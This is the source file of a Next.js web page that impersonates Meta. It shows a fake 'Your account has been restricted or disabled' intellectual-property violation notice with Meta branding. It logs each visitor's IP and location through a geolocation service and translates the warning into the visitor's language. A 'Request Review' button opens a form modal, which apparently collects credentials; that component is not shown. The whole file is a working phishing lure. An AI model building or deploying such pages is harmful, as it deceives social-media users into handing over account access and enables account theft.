'use client';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';
import BackgroundImage from '@/assets/images/background.png';
import CounterfeitImage from '@/assets/images/counterfeit.png';
import CopyrightImage from '@/assets/images/copyright.png';
import HeroImage from '@/assets/images/bg_hero.png';
import MetaLogo from '@/assets/images/logo-meta.svg';
import TrademarkImage from '@/assets/images/trade-mark.png';
import WarningImage from '@/assets/images/ic_warning.svg';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        void fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = ['Violation of Community Standards', 'Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.', 'Your account has been restricted or disabled', 'We determined that some activity on your account may not follow our Community Standards.', 'In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.', 'Why this happened', 'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.', 'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.', 'What you can do', 'If you believe this action was taken by mistake, you may request a review.', 'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.', 'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.', 'Request Review', 'What is an Intellectual Property Violation?', 'Trademark', 'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another.', 'Copyright', 'Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art).', 'Counterfeit Goods', "A counterfeit good is a knockoff or replica version of another company's product."];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            await Promise.all(textsToTranslate.map(async (text) => {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }));

            setTranslations(translatedMap);
        };

        void translateAll();
    }, [geoInfo, translations]);

    return (
        <div className='min-h-screen bg-white text-[#1c2b33]'>
            <title>Violation of Community Standards</title>
            <header className='flex h-13 items-center justify-center border-b border-[#e0e0e0] bg-[#f5f6f6]'>
                <div className='flex w-full max-w-7xl items-center px-4'>
                    <Image src={MetaLogo} alt='Meta' className='h-5.5 w-auto' />
                </div>
            </header>
            <section className='bg-cover bg-center' style={{ backgroundImage: `url(${BackgroundImage.src})` }}>
                <div className='mx-auto flex max-w-7xl flex-wrap items-center justify-between gap-8 px-4 py-6'>
                    <div className='min-w-70 flex-1'>
                        <h1 className='mb-3 text-[32px] font-bold text-[#050505]'>{t('Violation of Community Standards')}</h1>
                        <p className='leading-6'>{t('Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.')}</p>
                    </div>
                    <div className='flex min-w-70 flex-1 justify-center'>
                        <Image src={HeroImage} alt='' className='max-h-72 w-auto' />
                    </div>
                </div>
            </section>
            <section className='border-b border-[#e0e0e0]'>
                <div className='mx-auto w-full max-w-334 px-4 py-8 sm:px-10 sm:py-10'>
                    <div className='mb-5'>
                        <div className='mb-2 flex items-start gap-2.5 sm:items-center'>
                            <Image src={WarningImage} alt='' width={29} height={29} />
                            <h2 className='text-2xl font-bold text-[#050505] sm:text-[30px]'>{t('Your account has been restricted or disabled')}</h2>
                        </div>
                        <p className='mb-2 leading-5.5'>{t('We determined that some activity on your account may not follow our Community Standards.')}</p>
                        <p className='leading-5.5'>{t('In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.')}</p>
                    </div>
                    {[['Why this happened', 'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.', 'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.'], ['What you can do', 'If you believe this action was taken by mistake, you may request a review.', 'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.', 'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.']].map(([title, ...paragraphs]) => (
                        <div key={title} className='mb-5 border-b border-[#e0e0e0] pb-5'>
                            <h3 className='mb-2 text-lg font-semibold text-[#050505]'>{t(title)}</h3>
                            {paragraphs.map((paragraph) => <p key={paragraph} className='mb-2 leading-5.5'>{t(paragraph)}</p>)}
                        </div>
                    ))}
                    <button onClick={() => { setModalKey((prev) => prev + 1); setModalOpen(true); }} className='mx-auto mt-5 flex h-11.5 w-full max-w-75 items-center justify-center rounded-full bg-[#1877f2] px-6 font-semibold text-white'>
                        {t('Request Review')}
                    </button>
                </div>
            </section>
            <section className='mx-auto max-w-7xl px-4 py-10'>
                <h2 className='mb-4 text-center text-[28px] font-bold'>{t('What is an Intellectual Property Violation?')}</h2>
                {[
                    ['Trademark', 'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another.', TrademarkImage],
                    ['Copyright', 'Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art).', CopyrightImage],
                    ['Counterfeit Goods', "A counterfeit good is a knockoff or replica version of another company's product.", CounterfeitImage]
                ].map(([title, copy, image], index) => (
                    <div key={title as string} className='my-10 flex flex-col items-center gap-8 py-6 md:my-0 md:flex-row md:gap-0'>
                        <div className={`w-full md:w-1/2 ${index % 2 === 1 ? 'md:order-2 md:pl-8' : 'md:pr-8'}`}>
                            <h3 className='text-[22px] font-bold'>{t(title as string)}</h3>
                            <p className='mt-2 leading-5.5'>{t(copy as string)}</p>
                        </div>
                        <div className={`flex w-full justify-center md:w-1/2 ${index % 2 === 1 ? 'md:order-1' : ''}`}>
                            <Image src={image} alt='' />
                        </div>
                    </div>
                ))}
            </section>
            <footer className='border-t border-[#e0e0e0] bg-[#f5f6f6] px-4 py-5 text-center text-[13px] text-gray-500'>© 2026 Meta</footer>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
